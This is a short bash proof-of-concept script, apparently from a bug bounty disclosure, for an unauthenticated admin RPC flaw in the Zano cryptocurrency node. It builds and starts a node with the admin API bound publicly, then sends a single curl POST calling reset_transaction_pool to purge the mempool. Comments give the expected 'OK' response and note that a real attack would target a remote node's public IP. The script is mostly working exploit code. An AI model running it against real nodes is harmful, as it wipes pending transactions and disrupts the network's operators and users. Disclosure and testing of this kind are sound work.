#!/usr/bin/env bash
# PoC for Zano unauthenticated reset_transaction_pool admin RPC (Immunefi #50228).
#
# When zanod runs with --rpc-enable-admin-api on a public bind, the reset_transaction_pool
# method purges the mempool with no auth. A single unauthenticated POST returns status OK.
set -euo pipefail

# 1) Build.
# git clone https://github.com/hyle-team/zano.git && cd zano && make -j"$(nproc)"

# 2) Start a testnet node with the admin API enabled and bound publicly.
#    ./build/release/src/zanod \
#      --rpc-enable-admin-api \
#      --rpc-bind-ip 0.0.0.0 \
#      --rpc-bind-port 8071 \
#      --testnet
#
#    (For a real attack the attacker targets a remote node's public IP; localhost shown here.)

HOST="${1:-127.0.0.1}"
PORT="${2:-8071}"

# 3) Unauthenticated purge.
curl -sS -X POST "http://${HOST}:${PORT}/json_rpc" \
  -H "Content-Type: application/json" \
  -d '{ "jsonrpc": "2.0", "id": "0", "method": "reset_transaction_pool", "params": {} }'
echo

# Expected:
# { "id": "0", "jsonrpc": "2.0", "result": { "status": "OK" } }
# -> mempool cleared; no token / header / IP allowlist was required.
